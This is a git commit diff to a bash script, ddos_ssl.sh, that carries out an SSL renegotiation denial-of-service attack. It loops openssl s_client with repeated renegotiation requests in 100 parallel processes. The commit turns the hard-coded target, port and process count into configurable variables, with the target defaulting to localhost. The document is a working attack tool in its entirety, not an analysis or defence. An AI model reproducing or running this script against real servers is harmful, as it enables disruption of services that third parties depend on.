9db5deb9d4b14e4ce7a8918f3dccf432481015ab
wenfengshi <wuzhimang@gmail.com>
2016-10-13 23:54:26 +0800

    update

--- ddos_ssl.sh
+++ ddos_ssl.sh
@@ -1,14 +1,19 @@
 #!/bin/bash
 
+target=127.0.0.1
+port=443
+parallel=100
+
+
 thc-ssl-dosit()
 {
     while :;
     do
-        (while :; do echo R; done) | openssl s_client -connect 127.0.0.1:443 2>/dev/null;
+        (while :; do echo R; done) | openssl s_client -connect $target:$port 2>/dev/null;
     done
 }
 
-for x in `seq 1 100`;
+for x in `seq 1 $parallel`;
 do
     thc-ssl-dosit &
 done
